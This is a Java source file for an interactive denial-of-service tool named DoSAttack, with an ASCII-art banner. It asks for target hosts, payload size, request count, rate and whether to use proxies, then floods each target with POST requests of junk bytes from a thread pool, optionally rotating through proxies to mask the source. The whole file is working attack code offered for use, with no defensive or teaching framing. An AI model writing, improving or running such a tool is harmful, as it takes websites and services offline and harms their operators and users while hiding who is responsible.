import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
public class DoSAttack {
    public static List<String> proxies = List.of(
        "http://10.10.1.10:3128",
        "http://10.10.1.11:3128",
        "http://10.10.1.12:3128"
    );
    public static void clearScreen() {
        System.out.print("\033[H\033[2J");
        System.out.flush();
    }
    public static Proxy getRandomProxy(StringBuilder selectedProxy) {
        Random random = new Random();
        String proxyStr = proxies.get(random.nextInt(proxies.size()));
        String strippedProxy = proxyStr.replace("http://", "");
        selectedProxy.append(strippedProxy);
        String[] proxyParts = strippedProxy.split(":");
        String proxyHost = proxyParts[0];
        int proxyPort = Integer.parseInt(proxyParts[1]);
        return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
    }

    public static boolean checkDomain(String domain) {
        String urlStr = "http://" + domain;
        try {
            URL url = new URL(urlStr);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("HEAD");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            int responseCode = connection.getResponseCode();
            return (responseCode >= 200 && responseCode < 400);
        } catch (IOException e) {
            return false;
        }
    }
    public static void sendRequest(String domain, int[] requestCounter, byte[] data, boolean useProxy) {
        String urlStr = "http://" + domain;
        LocalDateTime requestTime = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("HH:mm:ss.SSS");
        StringBuilder selectedProxy = new StringBuilder();
        try {
            long startTime = System.currentTimeMillis();
            URL url = new URL(urlStr);

            HttpURLConnection connection;
            if (useProxy) {
                Proxy proxy = getRandomProxy(selectedProxy);
                connection = (HttpURLConnection) url.openConnection(proxy);
            } else {
                connection = (HttpURLConnection) url.openConnection();
            }
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            OutputStream os = connection.getOutputStream();
            os.write(data);
            os.flush();
            os.close();
            int responseCode = connection.getResponseCode();
            long delay = System.currentTimeMillis() - startTime;
            synchronized (requestCounter) {
                requestCounter[0]++;
            }
            int sentDataSize = data.length;
            int receivedDataSize = connection.getContentLength();
            System.out.printf("\033[42m  \033[0m \033[32m(%d) | %s - %d : %.2f ms | %d : %d BYTE | %s | %s\033[0m%n", 
                    requestCounter[0], domain, responseCode, delay / 1000.0, sentDataSize, receivedDataSize, 
                    useProxy ? selectedProxy.toString() : "None", requestTime.format(formatter));
        } catch (IOException e) {
            synchronized (requestCounter) {
                requestCounter[0]++;
            }
            System.out.printf("\033[41m  \033[0m \033[31m(%d) | %s - 0 : fail | 0 : 0 BYTE | %s | %s\033[0m%n", 
                    requestCounter[0], domain, useProxy ? selectedProxy.toString() : "None", requestTime.format(formatter));
        }
    }
    public static byte[] selectDataSize() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mDATASIZE>>\033[37m");
            String dataSizeStr = scanner.nextLine();
            try {
                int dataSize = Integer.parseInt(dataSizeStr);
                if (dataSize > 0) {
                    return new byte[dataSize];
                } else {
                    clearScreen();
                    System.out.println("\033[31mInvalid input. Please enter a positive integer for data size.\033[0m");
                    sleep(3);
                    clearScreen();
                }
            } catch (NumberFormatException e) {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter a positive integer for data size.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }
    public static int selectQuantity() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mQUANTITY>>\033[37m");
            String quantityStr = scanner.nextLine();
            try {
                int quantity = Integer.parseInt(quantityStr);
                if (quantity > 0) {
                    return quantity;
                } else {
                    clearScreen();
                    System.out.println("\033[31mInvalid input. Please enter a positive integer for quantity.\033[0m");
                    sleep(3);
                    clearScreen();
                }
            } catch (NumberFormatException e) {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter a positive integer for quantity.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }
    public static double selectDelay() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mDELAY>>\033[37m");
            String delayStr = scanner.nextLine();
            try {
                double delay = Double.parseDouble(delayStr);
                if (delay > 0) {
                    return delay;
                } else {
                    clearScreen();
                    System.out.println("\033[31mInvalid input. Delay must be a positive number.\033[0m");
                    sleep(3);
                    clearScreen();
                }
            } catch (NumberFormatException e) {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter a valid number for delay.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }
    public static boolean selectUseProxy() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mUSE PROXY? (yes/no)>>\033[37m");
            String useProxyStr = scanner.nextLine().trim().toLowerCase();
            if (useProxyStr.equals("yes")) {
                return true;
            } else if (useProxyStr.equals("no")) {
                return false;
            } else {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter 'yes' or 'no'.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }

    public static void sleep(int seconds) {
        try {
            Thread.sleep(seconds * 1000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    public static void startDoS() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            String domainsInput;
	        System.out.println("                          ,----,               ");
	        System.out.println("          ____         ,/   .`|               ");
	        System.out.println("        ,'  , `.     ,`   .'  :     ,---,     ");
	        System.out.println("     ,-+-,.' _ |   ;    ;     /   .'  .' `\\   ");
	        System.out.println("  ,-+-. ;   , || .'___,/    ,'  ,---.'     \\  ");
	        System.out.println(" ,--.'|'   |  ;| |    :     |   |   |  .`\\  | ");
	        System.out.println("|   |  ,', |  ': ;    |.';  ;   :   : |  '  | ");
	        System.out.println("|   | /  | |  || `----'  |  |   |   ' '  ;  : ");
	        System.out.println("'   | :  | :  |,     '   :  ;   '   | ;  .  | ");
	        System.out.println(";   . |  ; |--'      |   |  '   |   | :  |  ' ");
	        System.out.println("|   : |  | ,         '   :  |   '   : | /  ;  ");
	        System.out.println("|   : '  |/          ;   |.'    |   | '` ,/   ");
	        System.out.println(";   | |`-'           '---'      ;   :  .'     ");
	        System.out.println("|   ;/                          |   ,.'       ");
	        System.out.println("'---'                           '---'          \033[30m\033[47mv3.0\033[0m");
	        System.out.println();
            while (true) {
                System.out.print("\033[36mHOSTS>>\033[37m");
                domainsInput = scanner.nextLine();
                String[] domains = domainsInput.split(",");
                clearScreen();
                boolean allReachable = true;
                for (String domain : domains) {
                    domain = domain.trim();
                    if (!checkDomain(domain)) {
                        System.out.println("\033[31mUnable to connect to " + domain + " within 5 seconds. Please check the domain.\033[0m");
                        allReachable = false;
                    }
                }
                if (allReachable) {
                    System.out.println("\033[32mAll domains are reachable. Starting the attack.\033[0m");
                    sleep(2);
                    clearScreen();
                    break;
                } else {
                    sleep(3);
                    clearScreen();
                }
            }
            byte[] data = selectDataSize();
            clearScreen();
            int numberOfRequests = selectQuantity();
            clearScreen();
            double requestsPerSecond = selectDelay();
            clearScreen();
            boolean useProxy = selectUseProxy();
            clearScreen();
            int[] requestCounter = {0};
            ExecutorService executor = Executors.newFixedThreadPool(10);
            String[] domains = domainsInput.split(",");
            for (String domain : domains) {
                String finalDomain = domain.trim();
                for (int i = 0; numberOfRequests > i; i++) {
                    executor.execute(() -> sendRequest(finalDomain, requestCounter, data, useProxy));
                    try {
                        Thread.sleep((long) (1000 / requestsPerSecond));
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }
            }
            executor.shutdown();
            try {
                executor.awaitTermination(1, TimeUnit.HOURS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            System.out.println("\033[30m\033[47mEND | Wait 5 seconds\033[0m");
            sleep(5);
            clearScreen();
        }
    }
    public static void main(String[] args) {
        startDoS();
    }
                    }
